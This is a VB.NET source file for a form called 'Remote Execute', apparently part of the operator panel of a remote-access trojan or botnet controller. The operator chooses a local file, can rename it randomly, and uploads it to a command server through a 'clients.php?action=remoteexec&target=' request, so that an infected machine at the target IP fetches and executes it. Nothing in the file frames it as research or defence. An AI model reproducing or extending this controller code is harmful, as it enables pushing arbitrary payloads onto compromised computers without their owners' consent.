Imports System.Text
Imports System.IO
Imports System.Net

Public Class RemoteDownload
    Public targetIp As String = ""

    Private Sub RemoteDownload_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Remote Execute - " & targetIp
    End Sub

    Private Sub BrowseBTN_Click(sender As Object, e As EventArgs) Handles BrowseBTN.Click
        Dim chooseFilePathDialog As New OpenFileDialog()

        If chooseFilePathDialog.ShowDialog = DialogResult.OK Then
            FilePathTB.Text = chooseFilePathDialog.FileName
        End If
    End Sub

    Private Sub UploadBTN_Click(sender As Object, e As EventArgs) Handles UploadBTN.Click
        Dim fileName As String = Path.GetFileName(FilePathTB.Text)
        Dim extension As String = Path.GetExtension(FilePathTB.Text)
        Dim fileUploadWC As New WebClient

        If ChangeFileNameCB.Checked Then
            fileName = Utils.RandomString(8) & extension
        End If

        ' TODO : upload mp3 doesn't work
        fileUploadWC.UploadFile(
                My.Settings.vpsurl & "clients.php?action=remoteexec&target=" & targetIp & "&actioncontent=" & filename, FilePathTB.Text
        )

        MsgBox("File succesfully uploaded !", MsgBoxStyle.Information)
    End Sub

    Private Sub Upload_BTN_Availability_TM_Tick(sender As Object, e As EventArgs) Handles Upload_BTN_Availability_TM.Tick
        UploadBTN.Enabled = FilePathTB.Text.Trim.Length > 0
        UploadBTN.Refresh()
    End Sub
End Class